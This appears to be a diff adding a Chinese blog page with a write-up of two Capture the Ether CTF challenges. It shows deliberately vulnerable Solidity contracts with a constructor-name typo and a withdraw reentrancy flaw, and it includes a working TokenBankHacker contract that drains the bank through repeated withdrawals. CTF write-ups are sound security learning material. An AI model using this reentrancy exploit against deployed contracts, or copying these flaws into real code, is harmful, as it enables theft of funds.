@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.0.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.0.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.0.4" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.0.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  
+  <meta name="keywords" content="Solidity,Ethereum,Blockchain," />
+
+
+<meta name="description" content="MiscellaneousAssume ownership目标合约12345678910111213141516pragma solidity ^0.4.21;contract AssumeOwnershipChallenge &amp;#123;    address owner;    bool public isComplete;    function AssumeOwmershipChallen">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Capturetheether 题解（Miscellaneous）">
+<meta property="og:url" content="http://yoursite.com/2020/12/03/capturetheether-miscellaneous/index.html">
+<meta property="og:site_name" content="Lanford33">
+<meta property="og:description" content="MiscellaneousAssume ownership目标合约12345678910111213141516pragma solidity ^0.4.21;contract AssumeOwnershipChallenge &amp;#123;    address owner;    bool public isComplete;    function AssumeOwmershipChallen">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-12-03T04:39:18.000Z">
+<meta property="article:modified_time" content="2020-12-03T04:44:11.755Z">
+<meta property="article:author" content="Lanford33">
+<meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="Ethereum">
+<meta property="article:tag" content="Blockchain">
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/12/03/capturetheether-miscellaneous/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+  <title>Capturetheether 题解（Miscellaneous） | Lanford33</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lanford33</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">来写点东西吧！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/03/capturetheether-miscellaneous/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lanford33">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lanford33">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Capturetheether 题解（Miscellaneous）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-03T12:39:18+08:00">2020-12-03</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Coding/" itemprop="url" rel="index"><span itemprop="name">Coding</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><h4 id="目标合约"><a href="#目标合约" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">AssumeOwmershipChallenge</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h4 id="通关条件"><a href="#通关条件" class="headerlink" title="通关条件"></a>通关条件</h4><p>成为合约 owner</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>构造函数 typo，直接调用 AssumeOwmershipChallenge 函数即可成为 owner。</p>
+<h3 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h3><h4 id="目标合约-1"><a href="#目标合约-1" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">tokenFallback</span>(<span class="params">address from, uint256 value, bytes data</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">SimpleERC223Token</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Track how many tokens are owned by each address.</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">"Simple ERC223 Token"</span>;</span><br><span class="line">    string public symbol = <span class="string">"SET"</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply = <span class="number">1000000</span> * (uint256(<span class="number">10</span>) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">SimpleERC223Token</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit Transfer(address(<span class="number">0</span>), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isContract</span>(<span class="params">address _addr</span>) <span class="title">private</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool is_contract</span>) </span>&#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">//retrieve the size of the code on target address, this needs assembly</span></span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint256 value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        <span class="keyword">return</span> transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint256 value, bytes data</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint256 value</span>)</span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">bool success</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address from, address to, uint256 value</span>)</span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">bool success</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(value &lt;= balanceOf[<span class="keyword">from</span>]);</span><br><span class="line">        <span class="built_in">require</span>(value &lt;= allowance[<span class="keyword">from</span>][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[<span class="keyword">from</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[<span class="keyword">from</span>][msg.sender] -= value;</span><br><span class="line">        emit Transfer(<span class="keyword">from</span>, to, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">TokenBankChallenge</span>(<span class="params">address player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        token = <span class="keyword">new</span> SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Divide up the 1,000,000 tokens, which are all initially assigned to</span></span><br><span class="line">        <span class="comment">// the token contract's creator (this contract).</span></span><br><span class="line">        balanceOf[msg.sender] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;  <span class="comment">// half for me</span></span><br><span class="line">        balanceOf[player] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;      <span class="comment">// half for you</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> token.balanceOf(<span class="keyword">this</span>) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">tokenFallback</span>(<span class="params">address from, uint256 value, bytes</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == address(token)); <span class="comment">// ？？这能通过吗？</span></span><br><span class="line">        <span class="built_in">require</span>(balanceOf[<span class="keyword">from</span>] + value &gt;= balanceOf[<span class="keyword">from</span>]);</span><br><span class="line"></span><br><span class="line">        balanceOf[<span class="keyword">from</span>] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通关条件-1"><a href="#通关条件-1" class="headerlink" title="通关条件"></a>通关条件</h4><p>把 TokenBankChallenge 合约中的代币取光</p>
+<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>阅读合约，应该能发现下面的问题：</p>
+<ol>
+<li>TokenBankChallenge 合约的 withdraw 函数存在明显的重入漏洞，token.transfer 在 balance 调整前执行，而 token.transfer 是可能会调用其他合约的 tokenFallback 函数的，在其他合约的 tokenFallback 函数实现中可以发起对 withdraw 的重入。本题的解法应该就是重入 withdraw 了。</li>
+<li>用 isContract 判断地址是不是合约并不可靠。如果在合约的 constructor 中触发这个判断，此时 extcodesize(_addr) 为 0，合约地址会被误判为非合约地址。但是在本题中这没什么问题。我们需要的是 isContract(to) 为真，使得 tokenFallback 可以被调用，以进行重入攻击。</li>
+</ol>
+<p>有了👆的观察，可以得到以下攻击流程：</p>
+<ol>
+<li>部署攻击合约。攻击合约需要可以调用 bank 的 withdraw 函数，并实现 tokenFallback 函数；</li>
+<li>从 bank 中 withdraw 到 player 地址；</li>
+<li>从 player 地址给攻击合约转账。此时会调用攻击合约的 tokenFallback 函数，我们需要在攻击合约中对资金来源做判断，如果来源是 player  地址，则直接将资金转入 bank；</li>
+<li>通过攻击合约调用 bank.withdraw。bank.withdraw 会调用 token.transfer 向攻击合约转账，攻击合约的 tokenFallback 会被调用。由于资金并非来自 player 地址，所以我们在 tokenFallback 中重入 bank.withdraw。bank 中一共 100 万个币，取光即可。</li>
+</ol>
+<p>攻击合约代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract TokenBankHacker is ITokenReceiver &#123;</span><br><span class="line"></span><br><span class="line">    SimpleERC223Token token;</span><br><span class="line">    TokenBankChallenge bank;</span><br><span class="line">    address addr;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setParams</span>(<span class="params">SimpleERC223Token _token, TokenBankChallenge _bank, address _addr</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        token = _token;</span><br><span class="line">        bank = _bank;</span><br><span class="line">        addr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        bank.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">tokenFallback</span>(<span class="params">address from, uint256 value, bytes data</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">from</span> == addr) &#123;</span><br><span class="line">            token.transfer(address(bank), value, data);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token.balanceOf(address(<span class="keyword">this</span>)) &lt; <span class="number">1000000000000000000000000</span>) &#123;</span><br><span class="line">            bank.withdraw(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Solidity/" rel="tag"># Solidity</a>
+          
+            <a href="/tags/Ethereum/" rel="tag"># Ethereum</a>
+          
+            <a href="/tags/Blockchain/" rel="tag"># Blockchain</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/03/capturetheether-accounts/" rel="next" title="Capturetheether 题解（Accounts）">
+                <i class="fa fa-chevron-left"></i> Capturetheether 题解（Accounts）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Lanford33</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/%7C%7C%20archive">
+                
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">分类</span>
+                  
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Miscellaneous"><span class="nav-number">1.</span> <span class="nav-text">Miscellaneous</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Assume-ownership"><span class="nav-number">1.1.</span> <span class="nav-text">Assume ownership</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#目标合约"><span class="nav-number">1.1.1.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通关条件"><span class="nav-number">1.1.2.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目分析"><span class="nav-number">1.1.3.</span> <span class="nav-text">题目分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token-bank"><span class="nav-number">1.2.</span> <span class="nav-text">Token bank</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#目标合约-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通关条件-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目分析-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">题目分析</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lanford33</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Mist</a> v6.0.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.0.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.0.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.0.4"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
